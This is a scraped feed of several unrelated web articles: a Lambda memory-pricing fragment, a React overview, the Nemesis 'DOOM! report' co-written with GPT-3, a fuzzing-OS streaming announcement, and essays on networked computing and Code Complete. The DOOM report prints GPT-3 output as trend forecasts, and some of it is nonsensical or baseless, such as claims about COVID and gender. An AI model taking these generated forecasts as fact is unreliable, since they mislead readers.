<p>Deciding which price point is best for your workload depends on your requirements: if it’s purely cost-driven, 1769 MB or 3009 MB might be a good starting point. If it’s performance driven, do run some tests at 5308, 7077 and 8846 MB. These memory configurations might perform significantly better at a marginally higher cost.</p>
<h3>Conclusion</h3>
<p>You might have hoped that the new high-memory Lambda functions would also improve single-threaded performance, but alas - the functions seem to run on exactly the same hardware as their lowly 3008 MB siblings. However, the higher Lambda tiers do include three, four, five and six CPU cores. In multi-threaded processes, a single MB …</p></div></div>

December 7, 2020 | https://blog.graphqleditor.com/react-js-powerhouse/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/react-js-powerhouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After taking a look at <a href="https://blog.graphqleditor.com/vue-overview/">Vue</a> and <a href="https://blog.graphqleditor.com/angular-overview/">Angular</a> it’s time to check out the last of the big three -  <strong>React</strong>. </p>
<p>In terms of popularity and user base it might be the biggest of the three so let’s look at how it got here. It’s also worth mentioning there has been a lot of discussion on if React is a framework or a library, with both sides of the argument nitpicking the definitions. How you call it isn’t really of the utmost importance when you’re actually using it, so let’s just call it a library since that’s how it’s referred to on its official website.</p>
<h2>Hello World!</h2>
<p>React was created by Jordan Walke, a software engineer working for Facebook and it first appeared as FaxJS in 2011. The same year it got its first use in Facebook’s newsfeed and a year later on Instagram.com. May 2013 saw the big launch with React becoming opensource and publicly available, it was a bit of a rocky start with many being sceptical about its usefulness. Later the same year it became available in Python Applications and Ruby on Rails. By 2014 was steadily gaining users and the community started growing quickly. 2015 was the big break and the start of mainstream recognition as big companies like Netflix and Airbnb started using the library. The following years saw numerous improvements with the most recent version 17.0 coming out on October 20 2020.</p>
<h2>JSX and Virtual DOM</h2>
<p>Shedding some light on the background is fine and all, but the main ‘selling point’ (don’t worry, it’s opensource) of the library are its features. React is basically a frontend library aimed at helping developers build user interfaces. The most basic advantage, as with any library, is that it provides reusable code which saves time and reduces the chances of coding errors. Obviously that’s not all it does, ever since its initial release two features have been the backbone of React</p>
<ul>
<li><strong>JSX:</strong> React uses JSX (a syntax extension to JavaScript) instead of basic JavaScript for templating. It lets you easily modify the DOM using simple HTML-style code and is compatible with all web browsers.</li>
<li><strong>Virtual DOM:</strong> React creates a data structure cache which traces the changes made and then updates only the relevant part of the DOM. Let’s say a user leaves a comment under the article, normally for it to appear the entire DOM would have to be updated, while React scans the DOM for changes and updates only the relevant segment. This makes for an important performance boost since it means way less computing power used and significantly shorter loading time. While that might not sound like much, think about the scale, we’re talking here about something made for Facebook and not some small blog with a handful of users commenting.</li>
</ul>

<h2>Going native</h2>
<p>With the basic features out of the way we can look at some things that were added later. React Native was released in March 2015 letting developers create natively-rendered apps for iOS, Android and a multitude of other platforms. It quickly became one of the most used tools for mobile app development and was adopted by big companies like Skype, Soundcloud, Ubereats or Walmart. What’s the difference? Well ReactJS still uses some CSS and HTML elements while React Native uses native mobile UI elements. As cross-platform is very highly valued in mobile development it’s little wonder why it quickly became so popular.</p>

<h2>Hooks</h2>
<p>The new feature in version 16.8 released early last year was adding Hooks. Hooks are basically functions that let you use state and other React features without writing a class component. This way you can ‘hook into’ React and use state and lifecycle methods inside functional components. They are reusable and provide better code composition and flexibility in moving around the component tree. With Hooks functional components can be used for almost everything from rendering UI to handling state and logic. You’ll find some built-in Hooks shipped with React and since they are reusable you’ll find lots of useful ones created by others or you can always create your own. There are two main rules to Hooks:</p>
<ul>
<li><strong>Do not use Hooks inside loops, conditions, or nested functions</strong> - this ensures that Hooks are called in the right order each time a component renders and their state is preserved between multiple calls.</li>
<li><strong>Only use Hooks from inside React Functions</strong> - this ensures all stateful logic in a component is clearly visible from the source code.</li>
</ul>

<h2>More to come</h2>
<p>Version 17.0 was released about a month and a half ago and it was the first major release without any developer-facing features. The update was primarily focused on making it easier to upgrade React itself. It’s not like that’s it though, the team even called this update a stepping stone while they work on new features. So if those mentioned above did not convince you there’s more coming soon. Oh and if you’re up for some more convincing, next time we’ll take a look at some of the most useful component libraries for React.</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>

<h3>0. Intro</h3>
<p>The end of trends has been heralded by various outlets for years (see <a href="https://www.npr.org/2011/02/09/133616425/the-end-of-trends-if-its-hot-its-over?t=1603812659117">here</a>, <a href="https://www.wmagazine.com/story/fashion-trends-2017-retail-buyers/">here</a> and many more on our <a href="https://are.na/nemesis/the-end-of-trends">Are.na channel</a>).</p>
<p>But COVID time is crazy. We had a hunch that the hype cycle itself was finally in its true death throes – related to economic collapse, popular uprising, a general sense of consumer fatigue, and the breakdown of a consensus reality in which such trends could incubate. Since trends are a temporal phenomenon (they have to start, peak, fade away, typify a time, bottle the zeitgeist, etc.) we began with a simple survey about the breakdown of narrative time, first circulated through our personal social media accounts. We asked the following three questions:</p>
<ul>
<li><strong>How would you describe the time we live in?</strong></li>
<li><strong>What does the future hold?</strong></li>
<li><strong>What was life like 10 years ago?</strong></li>
</ul>
<p>Then we ran the same questions through an online survey distributed to 150 randomly chosen respondents, deployed in collaboration with <a href="http://g-r-l.com/">General Research Laboratories</a>. These responses, which will likely appear in a future memo, ranged from deeply personal to millenarian to an extreme form of ‘new optimism’.</p>
<p>Then our process took a crazier turn. In July 2020, OpenAI released <a href="https://en.wikipedia.org/wiki/GPT-3">GPT-3</a> for beta testing – a natural language processing system (colloquially, an “AI”) that uses deep learning to produce human-like text. <strong>K Allado-McDowell</strong>, writer, co-founder of the Artists + Machine Intelligence program at Google AI and friend of Nemesis, had started doing experimental collaborative writing with GPT-3. By exploring its quirks, K was already building an empirical understanding of GPT-3’s ability to articulate the nature of consciousness, memory, language, and cosmology. (K’s book <strong>Pharmako-AI</strong>, co-written with GPT-3, <a href="https://ignota.org/products/pharmako-ai">is forthcoming from Ignota Books</a>).</p>
<p>We were drawn to the oracular quality of the text generated by GPT-3, and became curious about how it could interact with the material we had gathered.</p>

<p><strong>Generative Pre-trained Transformer 3</strong> is the third-generation language prediction model in the GPT-n series created by <a href="https://openai.com/">OpenAI</a>. It has a capacity of 175 billion machine learning parameters, which is two orders of magnitude more than its predecessor GPT-2, which already had some <a href="https://slatestarcodex.com/2020/01/06/a-very-unlikely-chess-game/">astonishing capabilities</a>. In a crudely simplified sense, GPT-3 was trained by reading the entire Internet (or at least a non-trivial portion of it). Within limits which are currently being <a href="https://www.gwern.net/GPT-3">explored</a>, the quality of the text generated by GPT-3 is so high that it is <a href="https://www.theguardian.com/commentisfree/2020/sep/08/robot-wrote-this-article-gpt-3?fbclid=IwAR3BnzQRDBsDdYqo_bY7grkK2j-BmQjXWueIyvQMnsWs6MFz4PsMvm72hAg">difficult or impossible</a> to distinguish from that written by a human.</p>
<p>Meanwhile, our examination of the end-of-trends had us thinking about “trend forecasting” as early 21st-century vernacular for cultural analysis and the corporate performance of futurity. We knew the concept had largely been made redundant by data farming, think pieces, memes, and rampant B.S. So instead of using our survey results to write more baseless claims about a perilous future, we took another tack. </p>
<p>With the generous help of K – who had quickly become a skilled GPT-3 whisperer – we began feeding it our survey results, in the form of essayistic synopses that summarized the key points of the respondents and quoted choice answers. We left open-ended, future-facing sentence fragments at the end of these and let GPT-3 fill in the rest, like a demented version of Gmail’s suggestive text feature. K ran the experiment via screenshare, tweaking the levers controlling the randomness and creativity of GPT-3’s output. Not every roll of the GPT-3 dice yielded equivalent results. Some were loopy, repetitive or on the gibberish spectrum. But with subsequent tweaks to the sentence fragments we used to seed it, as well as trimming back excess text and hitting “generate” again, we started to receive some interesting results. Then we began feeding some of the more exciting concepts back into the machine, improvising the inputs and departing from our original survey synopses. We also threw in the beginning of our last memo, The Umami Theory of Value, and let GPT-3 fill in the rest. </p>
<p>As we worked, GPT-3 quickly recognized the genre of our undertaking: a report concerned with the future written by some kind of consultancy, expert group, or think tank. So it inadvertently rebranded us, naming this consultancy <strong>DOOM!</strong>:</p>
<p>“Our goal at DOOM! will be to consider a plurality of futures and then doing everything that we can to prevent nuclear war, oblivion and ruin.”</p>
<p>In some oblique way, that is ultimately what’s at stake in this report.</p>
<p>What follows is a text collaboratively composed by Nemesis, GPT-3, K Allado-McDowell and our survey respondents, but arguably authored by none of us, per se. Instead you could say this report was written by the <a href="https://en.wikipedia.org/wiki/The_Third_Mind">“third mind”</a> of DOOM! which spontaneously arose when we began to process this information together with the conscious goal of generating predictions about the future. The outputs of our GPT-3 experiments have been trimmed, edited for grammar, minorly tweaked and ordered into numbered chapters. All text in <span>yellow</span> is GPT-3’s output. Emphasis in <strong>bold</strong> is by us. Paintings by <a href="https://www.matthewmarks.com/new-york/artists/leidy-churchman/">Leidy Churchman</a>.</p>

<h3>1. DOOM!</h3>
<p>Our goal at DOOM! will be to consider a plurality of futures and then do everything that we can to prevent nuclear war, oblivion and ruin.</p>

<h3>2. JAWS OF CHAOS</h3>
<div>
<p>As trend forecasters we predict <strong>Future Radicalization</strong> will only increase and hasten what is to come: a downward spiral that will intensify, accelerate, and accelerate more until it reaches what some call the “<strong>Jaws of Chaos.</strong>” Only then will the system give way and turn into something completely different.</p>
<p>This transformation through the “Jaws of Chaos” will affect business in three key ways:</p>
<ul>
<li>it will bring a new set of organizational models; </li>
<li>it will change the way we think about the value of the human being; </li>
<li>it will bring new forms of finance, which will enable new forms of business, and in turn, new forms of human interaction.</li>
</ul>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/99730aa756-1603900195/leidy3.png"></figure>

<h3>3. TEMPORAL SCHISM</h3>
<div>
<p>There are several possible futures that meet the description of a post-post-apocalyptic world, but there is no way to know if any of them will materialize. </p>
<p>The easiest way to think about this is to ask yourself, “<strong>what’s the least stable, most destructive, and least predictable future I can imagine?</strong>” </p>
<p>In this way, an apocalypse is defined as a radical restructuring of the world, to the point that it creates <strong>an irreconcilable schism between the past and the present</strong>.</p>
</div>

<h3>4. PEAK EVERYTHING</h3>
<p>Just a few years ago, foreseeing dark times might have been seen as alarmist. It was common to hear people say “don’t worry, we’ve got a plan…” However, the COVID-19 pandemic came and materialized in full-blown fashion on our doorsteps, and there appears to be no “plan”…possibly not even a hope. There are echoes of <strong>“Peak Everything”</strong> in the responses to our survey: resource scarcity, climate change, systemic collapse, uncontrollable change.</p>

<h3>5. MEGATRENDS (THE BOOK OF PROBLEMS)</h3>
<div>
<p>In the vast interplay of cultural patterns known as “trends”, the highest level of coherence is known as a “mega-trend.” </p>
<p><strong>Mega-trends are mega-problems that affect many levels of human existence.</strong></p>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/ce009fd226-1603900709/large_365aad8aa318d0bb0b90b4019b5a810f-1.jpg"></figure>

<h3>6. GENDER</h3>
<div>
<p>It has been said that today’s teens are the “gender neutral generation”, thus signaling an end to the gendered division between male and female. This is true at a purely anecdotal level, but also true on a more abstract level. <strong>COVID-19 has introduced a sexless threat into the human race, and as a result, gender no longer serves any purpose.</strong> </p>
<p>“Right now, if you walk through the streets and look at everyone you see, and try to guess their gender solely based on their clothing, I would say that a good <strong>70-80% of the people you see will end up being the gender the clothes suggest</strong>. In the future, I could see that percentage being much smaller.”</p>
</div>

<h3>7. COVID-19</h3>
<div>
<p>There is a rapid decay of our knowledge of COVID-19.</p>
<p><strong>Every day we know less about COVID-19 than we did yesterday. Thus, the effects of COVID-19 decay. The processes taking place in our world today will lead to a future situation in which our knowledge about COVID-19 will decay. Thus based on the structure of our knowledge, we predict that the effects of COVID-19 will decay.</strong></p>
</div>

<h3>8. DRUGS</h3>
<p>New drugs that stop panic attacks or aid in the creation of false memories are coming to the forefront of the field. </p>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/87709702f7-1603369576/leidy2.jpg"></figure>

<h3>9. FORKING PATHS</h3>
<div>
<p>A forked path is defined as: “a situation or road leading to two or more possibilities or outcomes”. </p>
<p>We see this theme in a few of the longer responses. This one is a bit stilted, but expresses the concern that the apparently opposite situations of ten years ago were not actually opposite:  </p>
<p>“… when I ‘thought’ of the pre-2008 world, I realized that it was only my perception, that it was probably more sinister and dark and irrevocably damaged than I thought. And now, 10 years post, I do not see a ‘forked path,’ but a convergence where we all appear to be on the ‘same path’.” </p>
<p>A quantum understanding of the notion of paths and forking paths implies inevitability. Ten years ago was perhaps an inflection point because it was a time of “impact” in a larger sense. Each response to the survey that describes it as an inflection point is a bit wary of the concept of the <strong>in-ev-it-a-ble</strong>, because it fails to include an understanding of choice, agency, and control.</p>
</div>

<h3>10. THE END OF TRENDS</h3>
<div>
<p>The fractal property of trends and prediction implies a meta-fractal perspective that made a few respondents uncomfortable.</p>
<p>We may be witnessing <strong>the end of the trends in general</strong>. Even what we may be witnessing as a new trend or paradigm may be (a) a higher order statistical cluster, or (b) a continuing trend within a <strong>collapsing paradigm</strong>.</p>
</div>

<figure><img alt="" src="https://nemesis.global/media/pages/memos/the-doom-report/ecb416eb76-1603896230/leidy.png"></figure>

<h3>12. COMPLEXITY</h3>
<div>
<p>When we think about the definition of complicated, we need to look at two different components: </p>
<ol>
<li>
<p><strong>Complexity, as in the nature of the information problems we face – as they become bigger, they expand to include more and more of the universe (in theory)</strong></p>
</li>
<li>
<p><strong>Control, or the lack thereof</strong></p>
</li>
</ol>
<p>Ten years ago, people thought they …</p></div></div></div></div>

  <div itemprop="articleBody">
    <h2 id="summary">Summary</h2>

<p>We’re going to work on an <em>operating system</em> which is designed specifically for fuzzing! This is going to be a streaming series for most of December which will cover making a new operating system with a strong focus on fuzzing. This means that things like the memory manager, determinism, and scalability will be the most important parts of the OS, and a lot of effort will go into making them super fast!</p>

<h2 id="when">When</h2>

<p>Streaming will start sometime on Thursday, December 10th, probably around 18:00 UTC, but the streams will be at relatively random times on relatively random days. I can’t really commit to specific times!</p>

<p>Streams will likely be 4-5 days a week (probably M-F), and probably 8-12 hours in length. We’ll see, who knows, depends how much fun we have!</p>

<h2 id="where">Where</h2>

<p>You’ll be able to find the streams live on my <a href="https://twitch.tv/gamozo">Twitch Channel</a>, and if you’re unlucky and miss the streams, you’ll be able to find the recordings on my <a href="https://www.youtube.com/user/gamozolabs">YouTube Channel</a>! Don’t forget to like, comment, and subscribe, of course.</p>

<h2 id="what">What</h2>

<p>So… ultimately, I don’t really know what all will happen. But, I can predict a handful of things that we’ll do. First of all, it’s important to note that these streams are not training material. There is no prepared script, materials, flow, etc. If we end up building something totally different, that’s fine and we’re just going with the flow. There is no requirement of completing this project, or committing to certain ways the project will be done. So… with that aside.</p>

<p>We’ll be working on making an operating system, specifically for x86-64 (Intel flavor processors at the start, but AMD should work in non-hypervisor mode). This operating system will be designed for fuzzing, which means we’ll want to focus on making virtual memory management extremely fast. This is the backbone of most performant fuzzing, and we’ll need to be able to map in, unmap, and restore pages as they are modified by a fuzz case.</p>

<p>To keep you on the edge of your toes, I’ll first start with the boring things that we have to do.</p>

<h3 id="os">OS</h3>

<p>We have to make an operating system which boots. We’re gonna make a UEFI kernel, and we might dabble in running it on ARM64 as most of our code will be platform agnostic. But, who knows. It’ll be a pretty generic kernel, I’m mainly going to develop it on bare metal, but of course, we’ll make sure it runs on KVM/Xen/Hyper-V such that it can be used in a cloud environment.</p>

<h3 id="acpi">ACPI</h3>

<p>We’re gonna need to write ACPI table parsers such that we can find the NUMA locality of memory and CPUs on the system. This will be critical to getting a high performance memory manager that scales with cores.</p>

<h3 id="multi-processing">Multi-processing</h3>

<p>Of course, the kernel will support multiple cores, as otherwise it’s kinda useless for compute.</p>

<h3 id="10gbit-networking--tcp-stack">10gbit networking + TCP stack</h3>

<p>Since I never work with disks, I’m going to follow my standard model of just using the network as general purpose whatever. To do this, we’ll need 10gbit network drivers and a TCP stack such that we can communicate with the rest of a network. Nothing too crazy here, we’ll probably borrow some code from <a href="https://github.com/gamozolabs/chocolate_milk">Chocolate Milk</a></p>

<hr>

<h2 id="interesting-stuff">Interesting stuff</h2>

<p>Okay, that stuff was boring, lets talk about the fun parts!</p>

<h3 id="exotic-memory-model">Exotic memory model</h3>

<p>Since we’ll be “snapshotting” memory itself, we need to make sure things like pointers aren’t a problem. The fastest, easiest, and best solution to this, is simply to make sure the memory always gets loaded at the same address. This is no problem for a single core, but it’s difficult for multiple cores, as they need to have copies of the same data mapped at the same location.</p>

<p>What’s the solution? Well of course, we’ll have every single core on the system running it’s own address space. This means there is no shared memory between cores (with some very, very minor execeptions). Not only does this lead to execeptionally high memory access performance (due to caches only being in the exclusive or shared states), but it also means that shared (mutable) memory will not be a thing! This means that we’ll do all of our core synchronization through message passing, which is higher latency in the best case than shared memory models, but with an advantage of scaling much better. As long as our messages can be serialized to TCP streams, that means we can scale across the network without any effort.</p>

<p>This has some awesome properties since we no longer need any locks to our page tables to add and remove entries, nor do we need to perform any TLB shootdowns, which can cost tens thousands of cycles.</p>

<p>I used this model in <a href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html">Sushi Roll</a>, and I really miss it. It had incredibly good performance properties and forced a bit more thought about sharing information between cores.</p>

<h3 id="scaling">Scaling</h3>

<p>As with most things I write, linear scaling will be required, and scaling across the network is just implied, as it’s required for really any realistic application of fuzzing.</p>

<h3 id="fast-and-differential-memory-snapshotting">Fast and differential memory snapshotting</h3>

<p>So far, none of these things are super interesting. I’ve had many OSes that do these things well, for fuzzing, for quite a long time. However, I’ve never made these memory management techniques into a true data structure, rather I use them as needed manually. I plan to make the core of this operating system, a combination of Rust procedural macros and virtual memory management tricks to allow for arbitrary data structure to be stored in a tree-shaped checkpointed structure.</p>

<p>This will allow for fast transitions between different state of the structure as they were snapshotted. This will be done by leveraging the dirty bits in the page tables, and creating an allocator that will allocate in a pool of memory which will be saved and restored on snapshots. This memory will be treated as an opaque blob internally, and thus it can hold any information you want, device state, guest memory state, register state, something completely unrelated to fuzzing, won’t matter. To handle nested structures (or more specifically, pointers in structures which are to be tracked), we’ll use a Rust procedural macro to disallow untracked pointers within tracked structures.</p>

<p>Effectively, we’re going to heavily leverage the hardware’s MMU to differentally snapshot, teleport between, and restore blobs of memory. For fuzzing, this is necessary as a way to hold guest memory state and register state. By treating this opaquely, we can focus on doing the MMU aspects really well, and stop worrying about special casing all these variables that need to be restored upon resets.</p>

<h3 id="linux-emulator">Linux emulator</h3>

<p>Okay, so all of that is kinda to make room for developing high performance fuzzers. In my case, I want this mainly for a new rewrite of vectorized emulation, but to make it interesting for others, we’re going to implement a Linux emulator capable of running QEMU.</p>

<p>This means that we’ll be able to (probably staticially only) compile QEMU. Then we can take this binary, and load it into our OS and run QEMU in our OS. This means we can control the syscall responses to the requests QEMU makes. If we do this deterministically (we will), this means QEMU will be deterministic. Which thus means, the guest inside of QEMU will also be deterministic. You see? This is a technique I’ve used in the past, and works exceptionally well. We’ll definitely outperform Linux’s handling of syscalls, and we’ll scale better, and we’ll blow Linux away when it comes to memory management.</p>

<h3 id="kvm-emulator--hypervisor">KVM emulator + hypervisor</h3>

<p>So, I have no idea how hard this would be, but from about 5 minutes of skimming the interwebs, it seems that I could pretty easily write a hypervisor in my OS that emulates KVM ioctls. Meaning QEMU would just think KVM is there, and use it!</p>

<p>This will give us full control of QEMU’s determinism, syscalls, performance, and reset speeds… without actually having to modify QEMU code.</p>

<h2 id="thats-it">That’s it</h2>

<p>So that’s the plan. An OS + fast MMU code + hypervisor + Linux emulator, to allow us to deterministically run anything QEMU can run, which is effectively everything. We’ll do this with performance likely into the millions of VM resets per second per core, scaling linearly with cores, including over the network, to allow some of the fastest general purpose fuzzing the world has ever seen :D</p>

<h2 id="faq">FAQ</h2>

<p>Some people have asked questions on the internet, and I’ll post them here:</p>

<h3 id="hackernews-q1">Hackernews Q1</h3>

<p>Q:</p>

<div><div><pre><code>Huh. So my initial response was, "why on earth would you need a whole OS for that", but memory snapshotting and improved virtual memory performance might actually be a good justification. Linux does have CRIU which might be made to work for such a purpose, but I could see a reasonable person preferring to do it from a clean slate. On the other hand, if you need qemu to run applications (which I'm really unclear about; I can't tell if the plan is to run stuff natively on this OS or just to provide enough system to run qemu and then run apps on linux on qemu) then I'm surprised that it's not easier to just make qemu do what you want (again, I'm pretty sure qemu already has its own memory snapshotting features to build on).

Of course, writing an OS can be its own reward, too:) 
</code></pre></div></div>

<p>A:</p>

<div><div><pre><code>Oooh, wasn't really expecting this to make it to HN cause it was meant to be more of an announcement than a description.

But yes, I've done about 7 or 8 operating systems for fuzzing in the past and it's a massive performance (and cleanliness) cleanup. This one is going to be like an operating system I wrote 2-3 years ago for my vectorized emulation work.

To answer your QEMU questions, the goal is to effectively build QEMU with MUSL (just to make it static so I don't need a dynamic loader), and modify MUSL to turn all syscalls to `call` instructions. This means a "syscall" is just a call to another area, which will by my Rust Linux emulator. I'll implement the bare minimum syscalls (and enum variants to those syscalls) to get QEMU to work, nothing more. The goal is not to run Linux applications, but run a QEMU+MUSL combination which may be modified lightly if it means a lower emulation burden …</code></pre></div></div></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Back in the mists of time, an early Sun Microsystems employee by the name of John Gage coined the term “the network is the computer” to describe the centrality Sun put on network capabilities when designing their workstations.</p>
<p>As we saw last month in the hardware issue, Sun and other companies were interested in taking existing time-sharing computer designs, and selling customers one such system each. Given that the design of the computer means that multiple people can share one system, you need some way to justify this over-provision of resources. Move attention to the network, then: if everybody can login to access their files, printers, and emails from any of the workstations you deploy, then IT administration becomes part of the facilities department rather than the, well, IT department. The culmination of this design was the SunRay “ultra-thin” client, though that meant Sun had gone back to selling you a single time-sharing computer and multiple access terminals.</p>
<p>Note that Sun were careful to say <em>the</em> network, not <em>our</em> network. Silicon Valley has an egregious history of taking publicly-funded work (i.e. work paid for by US taxes) and enclosing it to create multiple billions of dollars in profit for a few individuals. The most obvious modern example is Google, who commercialised work that was in part funded by NASA and the NSF (as credited in the paper “The Anatomy of a Large-Scale&nbsp;Hypertextual&nbsp;Web Search Engine”).</p>
<p>Sun were no different. In a display of hubris, the founders named the company after the Stanford University Networks project, an effort to connect computers across the campus to the ARPAnet via TCP/IP over Ethernet. Andy Bechtolsheim’s work in designing the SUN workstation was paid for by DARPA and the university’s CS department.</p>
<p>Sun were not the only people to take publicly-funded work from the Stanford campus network and exploit it for private gain. Sandy Lerner, the director of computing facilities in Stanford’s business school, would be forced to resign her position at the university for commercially selling a university-designed network appliance that she had no license to exploit. She subsequently founded a private company to do the same: the Stanford “blue box” became IOS and the company’s name was Cisco.</p>
<p>Anyway, Sun shortened the rather dull phrase “somebody else’s network is the computer we want to profit from” and a marketing catchphrase was born. Oracle (finally a company bootstrapped on the work of its founder) evidently did not agree, or at least could not use the phrase to sue Google, and did not renew the trademark registration on acquiring Sun. Enter Cloudflare, who swooped in with much fanfare to snipe the phrase and use it for something something internet of things.</p>
<p>There is actually a lot packed into that slogan, “the network is the computer”, and lots of information for the software designer. To understand why, let us explore the truth of the statement: <em>why</em> is the network the computer?</p>
<p>It has all to do with Conway’s Law. As frequently stated, <a href="https://en.wikipedia.org/wiki/Conway's_law">Conway’s Law</a> says that organisations design systems that mirror their communication structure. This is usually interpreted very narrowly, meaning that software is designed along the communication structure of the software development team. In fact, Melvin Conway expressed that the word “systems” should be “defined broadly”.</p>
<p>It is common to think of a software product as being a technical system that mediates between two social systems: the system of producers (i.e. the software team) and the system of consumers (i.e. the clients, customers, “users”). In fact, this view comes from the Taylorist image of software creation that was prevalent in the twentieth century. The client’s roles are to know and express what software they need, and to accept our software once we have implemented all their requirements. Our role is to ask the questions that will uncover the requirements correctly and efficiently, and then to mechanistically and efficiently convert those requirements into the expected software.</p>
<p>A holistic and more accurate view of software development sees all three of these “systems” as part of a single social-technical system, in which the interactions between producers and consumers are too important, too frequent, and too nuanced to be externalised as outside factors influencing distinct systems. The software (both its existence and the act of its production) mediates a dialogue between developers and users over the software’s behaviour, in addition to producing a dialectic in which the appearance of the software both challenges existing beliefs about the system in which it is embedded, and shapes a new reality.</p>
<p>An early attempt to move away from the “three systems” model toward the “one system” model can be seen in the <a href="https://agilemanifesto.org/">Manifesto for Agile Software Development</a>. The manifesto maintains two distinct “classes” of actor—the “developer” who has the skill to create software and sells their labour into the software-creation exercise, and the “business” defined as sponsors who control the means by which software is paid for (gold owners) and users who supply the reason for the software’s existence (goal donors). The developers are still the knowledge-work equivalent of hired muscle:</p>
<ul>
<li>Our highest priority is to satisfy the customer through early and continuous delivery of valuable software.</li>
<li>Agile processes harness change for the customer’s competitive advantage.</li>
<li>Working software is the primary measure of progress.</li>
</ul>
<p>Nonetheless, the Agile manifesto describes the act of software creation as an ongoing dialogue between these actors, and requests a fuzzier and more fluid boundary between their domains. Thus, it includes principles describing their interaction:</p>
<ul>
<li>Business people and developers must work together daily throughout the project.</li>
<li>Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely.</li>
</ul>
<p>Notice the tension inherent in the manifesto’s principles, between the boundless (more working software, faster, is better) and the bounded (we should be able to reproduce this working situation forever). Developers working in the Agile context are invited to be Animal Farm’s Boxer, working as hard as they can for as long as they can in the hope to avoid the glue factory.</p>
<p>A more progressive paradigm for software development would remove the classifications of “programmer” and “business people”, regarding all as individuals with particular expertise who come together to pool that expertise in pursuit of a common goal. And thus could the network as the computer be truly recognised: the network as distributed source of and access to computing and communication supporting the social system in which it is embedded to the greatest possible extent. Let us explore what that would look like.</p>
<p>The Internet Protocol was designed in the United States during the 1970s, at the military Advanced Research Projects Agency (ARPA). As the designers were American cyberneticians, the system contains design principles that would be desirable in an ideal system in contemporary America. Each node is a “free actor”, choosing to form peer relationships with other nodes and route packets based on local information about those nodes and the destinations of the packets. The cyber-utopia, evinced by fanzines, the Whole Earth Catalog, and numerous cyberpunk novels, is one of total anarchy and individual liberty. The internet—as designed, anyway—perceives censorship as damage and routes around it.</p>
<p>In fact the period of establishment of IP as the de facto standard for internetworking (in the UK’s Joint Academic Network, Janet, the “killer app” that saw IP winning out was the X remote desktop protocol) also saw the rise and entrenchment of global capitalism and the proliferation of projects designed to transfer wealth en masse to the small cohort of billionaires. Ideas of interactions in “the marketplace” changed, and thus so did the ideas about a network best configured to support them. Out was the Kevin Flynn who ran an independent arcade business and deserved restitution from Encom in the movie Tron. In was the Encom that was still dominant in Tron: Legacy and released Encom OS 12 with the killer feature: “this year, we put a 12 on the box”.</p>
<p>As the ideology behind the “free market” changed, so did the “marketplace of connectivity”: the internet perceived censorship as an opportunity and asked who was to pay for it. Thus the modern internet: a small number of global players controlling the core, and a ragtag assortment of startups wondering whether to give their seed money to Microsoft, Google, or Amazon in exchange for a seat at the table. The network is the computer, and the computer <a href="https://deprogrammaticaipsum.com/five-computers/">has five access terminals</a>.</p>
<p>To understand how the internet’s adaptability to prevailing ideas about social systems enabled its survival, turn to a similar system that did not achieve the same. The Soviet vision of the internet, designed by cyberneticians in research institutions around the Union, never became a reality. Its story is told in the book <a href="https://mitpress.mit.edu/books/how-not-network-nation">How Not to Network a Nation</a> and the article <a href="https://web.mit.edu/slava/homepage/articles/Gerovitch-InterNyet.pdf">InterNyet: why the Soviet Union did not build a nationwide computer network</a>. Where Vint Cerf and Bob Kahn were supported in their plans to introduce a nationwide military computer network, their counterpart Viktor Glushkov (a Russian-born mathematician who founded the Institute of Cybernetics in Kyiv, Ukraine) met political obstacles and funding cuts. Why?</p>
<p>Principally because the network was <em>not</em> the computer: the system proposed did not support the system that was in place. Where the ARPA vision of the internet promised a decentralised system (what Americans think their system is) and was delivered by the heavily centralised, bureaucratic, planned economy of the US military apparatus (what America really is), the Glushkov project OGAS promised exactly the same in a very different context. The OGAS internet would be a decentralised …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>I almost wrote this article not about McConnell, but Microsoft Press. Why? Because developers always have something to learn, books have been a great way to share information for centuries, so reading about computing is central to the software engineering experience. If you do not believe me, reflect on the activity you are undertaking <em>right now</em>, reading an online magazine about computing.</p>
<p>You can tell the seriousness with which a platform company treats its developers—or its “developers, developers, developers”—by the tools, knowledge and support it gives them. Where some companies release their API documentation in bound form through a recognised publisher, Microsoft just went and started their own book imprint. Not to bind their header comments between two boards, but to support professional programmers whatever their stripe (though maybe bear in mind which company has your back when choosing your technology, please).</p>
<p>Am I over-selling the importance of Microsoft Press, though? Steve McConnell, in <em>Code Complete, 2nd Edition</em> (2004, Microsoft Press), cites DeMarco and Lister’s <em>Peopleware</em> when he tells readers “one book is more than most programmers read each year.” He recommends trying to get through one every two months, as well as journals like <em>IEEE Software</em>, <em>Communications of the ACM</em>, and the now defunct and much-missed <em>Dr. Dobb’s Journal</em>. The “software developer’s reading plan” at the back of the book contains 5 introductory-level books, 8 intermediate-level, and 7 leadership-level. It would take the median programmer (at least in 1999 when <em>Peopleware</em> was written) over 20 years to follow the plan, but a little over three years at McConnell’s suggested rate. As long as you read <em>CC2E</em> first to know how quickly you are supposed to be reading!</p>
<p>Coincidentally, I left university to look for a job (which I found in the very room where I conducted my job search) in 2004, the year <em>CC2E</em> was published. Within a couple of years, when it was clear that my ability to solve problems using a computer was being hampered by my home-grown and BASIC-honed techniques at expressing computer programs, a manager gave me a copy of <em>Code Complete</em>. And the rest, as they say, is history.</p>
